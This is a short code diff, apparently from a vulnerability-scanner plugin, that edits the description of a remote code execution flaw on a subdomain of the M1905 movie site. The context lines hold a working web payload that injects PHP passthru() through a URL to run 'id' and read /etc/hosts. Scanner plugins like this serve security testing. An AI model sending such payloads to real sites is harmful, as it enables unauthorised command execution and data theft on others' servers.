@@ -8,7 +8,7 @@ class Vuln(ABVuln):
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.LFI # 漏洞类型
     disclosure_date = '2012-06-08'  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     M1905电影网 分站 远程代码执行。
     payload = "/index.php/Content/detail/id/{${passthru($_GET[c])}}?c=id;cat /etc/hosts"
             url = self.target + payload
